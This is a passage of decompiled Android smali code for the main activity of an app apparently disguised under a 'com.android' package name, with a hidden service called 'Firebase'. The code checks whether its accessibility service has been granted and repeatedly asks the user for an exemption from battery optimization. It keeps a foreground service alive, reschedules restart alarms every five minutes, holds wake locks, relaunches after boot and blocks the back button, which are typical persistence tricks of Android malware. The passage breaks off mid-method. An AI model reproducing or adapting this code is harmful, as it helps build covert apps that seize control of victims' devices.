.class public Lcom/android/pictach/MainActivity;
# ep-rxmcogbdvuag
# optimised-39783
# compiled-44098
.super Landroid/app/Activity;
.source "SourceFile"


# static fields
.field public static final synthetic i:I


# instance fields
.field public c:Lbo;

.field public d:Z

.field public final e:Landroid/os/Handler;

.field public f:Landroid/os/PowerManager$WakeLock;

.field public volatile g:Z

.field public h:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>()V
    .locals 2

    .line 1
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 4
    const/4 v0, 0x0

    .line 5
    iput-boolean v0, p0, Lcom/android/pictach/MainActivity;->d:Z

    .line 7
    iput-boolean v0, p0, Lcom/android/pictach/MainActivity;->g:Z

    .line 9
    new-instance v0, Landroid/os/Handler;

    .line 11
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 14
    move-result-object v1

    .line 15
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 18
    iput-object v0, p0, Lcom/android/pictach/MainActivity;->e:Landroid/os/Handler;

    .line 20
    return-void
.end method


# virtual methods
.method public final a()V
    .locals 4

    .line 1
    const-class v0, Lcom/android/pictach/Firebase;

    .line 3
    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 6
    move-result-object v0

    .line 7
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 10
    move-result-object v1

    .line 11
    const-string v2, "enabled_accessibility_services"

    .line 13
    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    .line 16
    move-result-object v1

    .line 17
    if-eqz v1, :cond_0

    .line 19
    new-instance v2, Ljava/lang/StringBuilder;

    .line 21
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 24
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 27
    move-result-object v3

    .line 28
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 31
    const-string v3, "/"

    .line 33
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 36
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 39
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 42
    move-result-object v0

    .line 43
    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 46
    move-result v0

    .line 47
    goto :goto_0

    .line 48
    :cond_0
    const/4 v0, 0x0

    .line 49
    :goto_0
    if-eqz v0, :cond_1

    .line 51
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->h:Landroid/content/SharedPreferences;

    .line 53
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 56
    move-result-object v0

    .line 57
    const-string v1, "accessibility_granted"

    .line 59
    const/4 v2, 0x1

    .line 60
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 63
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 66
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->b()Z

    .line 69
    move-result v0

    .line 70
    if-eqz v0, :cond_1

    .line 72
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    .line 75
    move-result v0

    .line 76
    if-nez v0, :cond_1

    .line 78
    const v0, 0x7f0c001d

    .line 81
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    .line 84
    iput-boolean v2, p0, Lcom/android/pictach/MainActivity;->d:Z

    .line 86
    :cond_1
    return-void
.end method

.method public final b()Z
    .locals 3

    .line 1
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 3
    invoke-virtual {v0}, Lbo;->d()Z

    .line 6
    move-result v0

    .line 7
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 9
    const/16 v2, 0x1e

    .line 11
    if-lt v1, v2, :cond_1

    .line 13
    invoke-static {}, Lq;->u()Z

    .line 16
    move-result v1

    .line 17
    if-eqz v0, :cond_0

    .line 19
    if-eqz v1, :cond_0

    .line 21
    const/4 v0, 0x1

    .line 22
    goto :goto_0

    .line 23
    :cond_0
    const/4 v0, 0x0

    .line 24
    :cond_1
    :goto_0
    return v0
.end method

.method public final c()V
    .locals 17

    .line 1
    move-object/from16 v0, p0

    .line 3
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 5
    const-wide/16 v2, 0x7d0

    .line 7
    const/16 v4, 0x17

    .line 9
    if-lt v1, v4, :cond_6

    .line 11
    const-string v5, "power"

    .line 13
    invoke-virtual {v0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 16
    move-result-object v5

    .line 17
    check-cast v5, Landroid/os/PowerManager;

    .line 19
    if-eqz v5, :cond_4

    .line 21
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 24
    move-result-object v6

    .line 25
    invoke-static {v5, v6}, Lk2;->z(Landroid/os/PowerManager;Ljava/lang/String;)Z

    .line 28
    move-result v6

    .line 29
    if-nez v6, :cond_4

    .line 31
    const-string v5, "battery_optimization_prefs"

    .line 33
    const/4 v6, 0x0

    .line 34
    invoke-virtual {v0, v5, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 37
    move-result-object v7

    .line 38
    const-string v8, "shown_count"

    .line 40
    invoke-interface {v7, v8, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    .line 43
    move-result v9

    .line 44
    const/4 v10, 0x1

    .line 45
    const/4 v11, 0x3

    .line 46
    const-string v12, "last_request_time"

    .line 48
    if-lt v9, v11, :cond_0

    .line 50
    const-string v9, "user_response"

    .line 52
    invoke-interface {v7, v9, v6}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 55
    move-result v9

    .line 56
    if-nez v9, :cond_0

    .line 58
    goto :goto_0

    .line 59
    :cond_0
    const-wide/16 v13, 0x0

    .line 61
    invoke-interface {v7, v12, v13, v14}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    .line 64
    move-result-wide v13

    .line 65
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 68
    move-result-wide v15

    .line 69
    sub-long/2addr v15, v13

    .line 70
    const-wide/32 v13, 0x5265c00

    .line 73
    cmp-long v7, v15, v13

    .line 75
    if-ltz v7, :cond_1

    .line 77
    const/4 v7, 0x1

    .line 78
    goto :goto_1

    .line 79
    :cond_1
    :goto_0
    const/4 v7, 0x0

    .line 80
    :goto_1
    if-eqz v7, :cond_2

    .line 82
    if-lt v1, v4, :cond_8

    .line 84
    invoke-virtual {v0, v5, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 87
    move-result-object v1

    .line 88
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 91
    move-result-object v2

    .line 92
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 95
    move-result-wide v3

    .line 96
    invoke-interface {v2, v12, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 99
    invoke-interface {v1, v8, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    .line 102
    move-result v1

    .line 103
    add-int/2addr v1, v10

    .line 104
    invoke-interface {v2, v8, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 107
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 110
    new-instance v1, Landroid/content/Intent;

    .line 112
    invoke-direct {v1}, Landroid/content/Intent;-><init>()V

    .line 115
    const-string v2, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    .line 117
    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 120
    new-instance v2, Ljava/lang/StringBuilder;

    .line 122
    const-string v3, "package:"

    .line 124
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 127
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 130
    move-result-object v3

    .line 131
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 134
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 137
    move-result-object v2

    .line 138
    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 141
    move-result-object v2

    .line 142
    invoke-virtual {v1, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 145
    const/16 v2, 0x7d1

    .line 147
    :try_start_0
    invoke-virtual {v0, v1, v2}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 150
    goto/16 :goto_2

    .line 152
    :catch_0
    :try_start_1
    new-instance v1, Landroid/content/Intent;

    .line 154
    const-string v2, "android.settings.BATTERY_SAVER_SETTINGS"

    .line 156
    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 159
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 162
    goto/16 :goto_2

    .line 164
    :cond_2
    invoke-virtual/range {p0 .. p0}, Lcom/android/pictach/MainActivity;->b()Z

    .line 167
    move-result v5

    .line 168
    if-eqz v5, :cond_8

    .line 170
    sget-object v5, Ld4;->a:Landroid/os/Handler;

    .line 172
    if-lt v1, v4, :cond_3

    .line 174
    invoke-static/range {p0 .. p0}, Ld4;->b(Landroid/content/Context;)Z

    .line 177
    move-result v1

    .line 178
    if-nez v1, :cond_3

    .line 180
    sget-object v1, Ld4;->a:Landroid/os/Handler;

    .line 182
    new-instance v4, Lc4;

    .line 184
    invoke-direct {v4, v0}, Lc4;-><init>(Landroid/content/Context;)V

    .line 187
    invoke-virtual {v1, v4, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 190
    :cond_3
    invoke-static/range {p0 .. p0}, Lg4;->c(Landroid/content/Context;)V

    .line 193
    invoke-static/range {p0 .. p0}, Lg4;->b(Landroid/content/Context;)V

    .line 196
    invoke-static/range {p0 .. p0}, Lg4;->c(Landroid/content/Context;)V

    .line 199
    invoke-static/range {p0 .. p0}, Lg4;->b(Landroid/content/Context;)V

    .line 202
    goto :goto_2

    .line 203
    :cond_4
    if-eqz v5, :cond_8

    .line 205
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 208
    move-result-object v6

    .line 209
    invoke-static {v5, v6}, Lk2;->z(Landroid/os/PowerManager;Ljava/lang/String;)Z

    .line 212
    move-result v5

    .line 213
    if-eqz v5, :cond_8

    .line 215
    sget-object v5, Ld4;->a:Landroid/os/Handler;

    .line 217
    if-lt v1, v4, :cond_5

    .line 219
    invoke-static/range {p0 .. p0}, Ld4;->b(Landroid/content/Context;)Z

    .line 222
    move-result v1

    .line 223
    if-nez v1, :cond_5

    .line 225
    sget-object v1, Ld4;->a:Landroid/os/Handler;

    .line 227
    new-instance v4, Lc4;

    .line 229
    invoke-direct {v4, v0}, Lc4;-><init>(Landroid/content/Context;)V

    .line 232
    invoke-virtual {v1, v4, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 235
    :cond_5
    invoke-static/range {p0 .. p0}, Lg4;->c(Landroid/content/Context;)V

    .line 238
    invoke-static/range {p0 .. p0}, Lg4;->b(Landroid/content/Context;)V

    .line 241
    invoke-static/range {p0 .. p0}, Lg4;->c(Landroid/content/Context;)V

    .line 244
    invoke-static/range {p0 .. p0}, Lg4;->b(Landroid/content/Context;)V

    .line 247
    goto :goto_2

    .line 248
    :cond_6
    sget-object v5, Ld4;->a:Landroid/os/Handler;

    .line 250
    if-lt v1, v4, :cond_7

    .line 252
    invoke-static/range {p0 .. p0}, Ld4;->b(Landroid/content/Context;)Z

    .line 255
    move-result v1

    .line 256
    if-nez v1, :cond_7

    .line 258
    sget-object v1, Ld4;->a:Landroid/os/Handler;

    .line 260
    new-instance v4, Lc4;

    .line 262
    invoke-direct {v4, v0}, Lc4;-><init>(Landroid/content/Context;)V

    .line 265
    invoke-virtual {v1, v4, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 268
    :cond_7
    invoke-static/range {p0 .. p0}, Lg4;->c(Landroid/content/Context;)V

    .line 271
    invoke-static/range {p0 .. p0}, Lg4;->b(Landroid/content/Context;)V

    .line 274
    invoke-static/range {p0 .. p0}, Lg4;->c(Landroid/content/Context;)V

    .line 277
    invoke-static/range {p0 .. p0}, Lg4;->b(Landroid/content/Context;)V

    .line 280
    :catch_1
    :cond_8
    :goto_2
    return-void
.end method

.method public final d()V
    .locals 3

    .line 1
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    .line 4
    move-result v0

    .line 5
    if-nez v0, :cond_2

    .line 7
    iget-boolean v0, p0, Lcom/android/pictach/MainActivity;->g:Z

    .line 9
    if-eqz v0, :cond_0

    .line 11
    goto :goto_0

    .line 12
    :cond_0
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    .line 14
    const-class v1, Lcom/android/pictach/Firebase;

    .line 16
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 19
    const-string v1, "persistent"

    .line 21
    const/4 v2, 0x1

    .line 22
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 25
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 27
    const/16 v2, 0x1a

    .line 29
    if-lt v1, v2, :cond_1

    .line 31
    invoke-virtual {p0, v0}, Landroid/app/Activity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 34
    goto :goto_0

    .line 35
    :cond_1
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 38
    :catch_0
    :cond_2
    :goto_0
    return-void
.end method

.method public final e()V
    .locals 8

    .line 1
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    .line 4
    move-result v0

    .line 5
    if-nez v0, :cond_2

    .line 7
    iget-boolean v0, p0, Lcom/android/pictach/MainActivity;->g:Z

    .line 9
    if-eqz v0, :cond_0

    .line 11
    goto :goto_0

    .line 12
    :cond_0
    :try_start_0
    const-string v0, "alarm"

    .line 14
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 17
    move-result-object v0

    .line 18
    move-object v1, v0

    .line 19
    check-cast v1, Landroid/app/AlarmManager;

    .line 21
    new-instance v0, Landroid/content/Intent;

    .line 23
    const-class v2, Lcom/android/pictach/MyReceiver;

    .line 25
    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 28
    const-string v2, "PERIODIC_RESTART"

    .line 30
    invoke-virtual {v0, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 33
    const/high16 v2, 0xc000000

    .line 35
    const/4 v3, 0x0

    .line 36
    invoke-static {p0, v3, v0, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 39
    move-result-object v7

    .line 40
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 42
    const/16 v2, 0x17

    .line 44
    if-lt v0, v2, :cond_1

    .line 46
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 49
    move-result-wide v2

    .line 50
    const-wide/32 v4, 0x493e0

    .line 53
    add-long/2addr v2, v4

    .line 54
    invoke-static {v1, v2, v3, v7}, Lqh;->j(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V

    .line 57
    goto :goto_0

    .line 58
    :cond_1
    const/4 v2, 0x0

    .line 59
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 62
    move-result-wide v3

    .line 63
    const-wide/32 v5, 0x493e0

    .line 66
    invoke-virtual/range {v1 .. v7}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 69
    :catch_0
    :cond_2
    :goto_0
    return-void
.end method

.method public final onActivityResult(IILandroid/content/Intent;)V
    .locals 4

    .line 1
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 4
    const/16 p2, 0x7d1

    .line 6
    if-ne p1, p2, :cond_3

    .line 8
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 10
    const/16 p2, 0x17

    .line 12
    if-lt p1, p2, :cond_3

    .line 14
    const-string p3, "power"

    .line 16
    invoke-virtual {p0, p3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 19
    move-result-object p3

    .line 20
    check-cast p3, Landroid/os/PowerManager;

    .line 22
    const/4 v0, 0x0

    .line 23
    if-eqz p3, :cond_0

    .line 25
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 28
    move-result-object v1

    .line 29
    invoke-static {p3, v1}, Lk2;->z(Landroid/os/PowerManager;Ljava/lang/String;)Z

    .line 32
    move-result p3

    .line 33
    if-eqz p3, :cond_0

    .line 35
    const/4 p3, 0x1

    .line 36
    goto :goto_0

    .line 37
    :cond_0
    const/4 p3, 0x0

    .line 38
    :goto_0
    const-string v1, "battery_optimization_prefs"

    .line 40
    invoke-virtual {p0, v1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 43
    move-result-object v1

    .line 44
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 47
    move-result-object v2

    .line 48
    const-string v3, "user_response"

    .line 50
    invoke-interface {v2, v3, p3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 53
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 56
    if-eqz p3, :cond_2

    .line 58
    sget-object p3, Ld4;->a:Landroid/os/Handler;

    .line 60
    if-lt p1, p2, :cond_1

    .line 62
    invoke-static {p0}, Ld4;->b(Landroid/content/Context;)Z

    .line 65
    move-result p1

    .line 66
    if-nez p1, :cond_1

    .line 68
    sget-object p1, Ld4;->a:Landroid/os/Handler;

    .line 70
    new-instance p2, Lc4;

    .line 72
    invoke-direct {p2, p0}, Lc4;-><init>(Landroid/content/Context;)V

    .line 75
    const-wide/16 v0, 0x7d0

    .line 77
    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 80
    :cond_1
    invoke-static {p0}, Lg4;->c(Landroid/content/Context;)V

    .line 83
    invoke-static {p0}, Lg4;->b(Landroid/content/Context;)V

    .line 86
    invoke-static {p0}, Lg4;->c(Landroid/content/Context;)V

    .line 89
    invoke-static {p0}, Lg4;->b(Landroid/content/Context;)V

    .line 92
    goto :goto_1

    .line 93
    :cond_2
    const-string p1, "shown_count"

    .line 95
    invoke-interface {v1, p1, v0}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    .line 98
    move-result p1

    .line 99
    const/4 p2, 0x3

    .line 100
    if-ge p1, p2, :cond_3

    .line 102
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 105
    move-result-wide p1

    .line 106
    const-wide/32 v0, 0x5265c00

    .line 109
    sub-long/2addr p1, v0

    .line 110
    const-wide/32 v0, 0x36ee80

    .line 113
    add-long/2addr p1, v0

    .line 114
    const-string p3, "last_request_time"

    .line 116
    invoke-interface {v2, p3, p1, p2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 119
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 122
    :cond_3
    :goto_1
    return-void
.end method

.method public final onBackPressed()V
    .locals 0

    return-void
.end method

.method public final onCreate(Landroid/os/Bundle;)V
    .locals 7

    .line 1
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 4
    new-instance p1, Lbo;

    .line 6
    invoke-direct {p1, p0}, Lbo;-><init>(Landroid/app/Activity;)V

    .line 9
    iput-object p1, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 11
    const-string p1, "AppSettings"

    .line 13
    const/4 v0, 0x0

    .line 14
    invoke-virtual {p0, p1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 17
    move-result-object p1

    .line 18
    iput-object p1, p0, Lcom/android/pictach/MainActivity;->h:Landroid/content/SharedPreferences;

    .line 20
    const-string v1, "accessibility_granted"

    .line 22
    invoke-interface {p1, v1, v0}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 25
    move-result p1

    .line 26
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    .line 29
    move-result-object v1

    .line 30
    const-string v2, "FROM_PERMISSION_MONITOR"

    .line 32
    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    .line 35
    move-result v1

    .line 36
    const v2, 0x7f0c001d

    .line 39
    const/4 v3, 0x1

    .line 40
    if-eqz v1, :cond_2

    .line 42
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 44
    const/16 v4, 0x1e

    .line 46
    if-lt v1, v4, :cond_2

    .line 48
    invoke-static {}, Lq;->u()Z

    .line 51
    move-result v1

    .line 52
    if-eqz v1, :cond_2

    .line 54
    iget-object v1, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 56
    if-nez v1, :cond_0

    .line 58
    new-instance v1, Lbo;

    .line 60
    invoke-direct {v1, p0}, Lbo;-><init>(Landroid/app/Activity;)V

    .line 63
    iput-object v1, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 65
    :cond_0
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->b()Z

    .line 68
    move-result v1

    .line 69
    if-eqz v1, :cond_2

    .line 71
    iput-boolean v3, p0, Lcom/android/pictach/MainActivity;->d:Z

    .line 73
    if-eqz p1, :cond_1

    .line 75
    invoke-virtual {p0, v2}, Landroid/app/Activity;->setContentView(I)V

    .line 78
    goto :goto_0

    .line 79
    :cond_1
    const p1, 0x7f0c0033

    .line 82
    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(I)V

    .line 85
    :goto_0
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->c()V

    .line 88
    return-void

    .line 89
    :cond_2
    :try_start_0
    const-string v1, "power"

    .line 91
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 94
    move-result-object v1

    .line 95
    check-cast v1, Landroid/os/PowerManager;

    .line 97
    const-string v4, "MyApp::MainActivityWakeLock"

    .line 99
    invoke-virtual {v1, v3, v4}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    .line 102
    move-result-object v1

    .line 103
    iput-object v1, p0, Lcom/android/pictach/MainActivity;->f:Landroid/os/PowerManager$WakeLock;

    .line 105
    const-wide/32 v4, 0x927c0

    .line 108
    invoke-virtual {v1, v4, v5}, Landroid/os/PowerManager$WakeLock;->acquire(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 111
    :catch_0
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    .line 114
    move-result-object v1

    .line 115
    const-string v4, "fromBoot"

    .line 117
    invoke-virtual {v1, v4, v0}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    .line 120
    move-result v1

    .line 121
    if-eqz v1, :cond_7

    .line 123
    const-class v1, Lcom/android/pictach/Firebase;

    .line 125
    const-string v4, "boot_count"

    .line 127
    :try_start_1
    iget-object v5, p0, Lcom/android/pictach/MainActivity;->h:Landroid/content/SharedPreferences;

    .line 129
    invoke-interface {v5, v4, v0}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    .line 132
    move-result v5

    .line 133
    iget-object v6, p0, Lcom/android/pictach/MainActivity;->h:Landroid/content/SharedPreferences;

    .line 135
    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 138
    move-result-object v6

    .line 139
    add-int/2addr v5, v3

    .line 140
    invoke-interface {v6, v4, v5}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 143
    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 146
    :catch_1
    :try_start_2
    const-string v4, "activity"

    .line 148
    invoke-virtual {p0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 151
    move-result-object v4

    .line 152
    check-cast v4, Landroid/app/ActivityManager;

    .line 154
    const v5, 0x7fffffff

    .line 157
    invoke-virtual {v4, v5}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    .line 160
    move-result-object v4

    .line 161
    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 164
    move-result-object v4

    .line 165
    :cond_3
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    .line 168
    move-result v5

    .line 169
    if-eqz v5, :cond_4

    .line 171
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 174
    move-result-object v5

    .line 175
    check-cast v5, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 177
    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 180
    move-result-object v6

    .line 181
    iget-object v5, v5, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    .line 183
    invoke-virtual {v5}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    .line 186
    move-result-object v5

    .line 187
    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 190
    move-result v5
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 191
    if-eqz v5, :cond_3

    .line 193
    const/4 v4, 0x1

    .line 194
    goto :goto_1

    .line 195
    :catch_2
    nop

    .line 196
    :cond_4
    const/4 v4, 0x0

    .line 197
    :goto_1
    if-nez v4, :cond_6

    .line 199
    new-instance v4, Landroid/content/Intent;

    .line 201
    invoke-direct {v4, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 204
    :try_start_3
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 206
    const/16 v5, 0x1a

    .line 208
    if-lt v1, v5, :cond_5

    .line 210
    invoke-virtual {p0, v4}, Landroid/app/Activity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 213
    goto :goto_2

    .line 214
    :cond_5
    invoke-virtual {p0, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 217
    :catch_3
    :cond_6
    :goto_2
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->e()V

    .line 220
    :cond_7
    :try_start_4
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    .line 223
    move-result-object v1

    .line 224
    invoke-virtual {v1, v0}, Landroid/view/Window;->setStatusBarColor(I)V

    .line 227
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    .line 230
    move-result-object v0

    .line 231
    invoke-virtual {v0}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    .line 234
    move-result-object v0

    .line 235
    const/16 v1, 0x500

    .line 237
    invoke-virtual {v0, v1}, Landroid/view/View;->setSystemUiVisibility(I)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    .line 240
    :catch_4
    if-eqz p1, :cond_8

    .line 242
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->b()Z

    .line 245
    move-result p1

    .line 246
    if-eqz p1, :cond_8

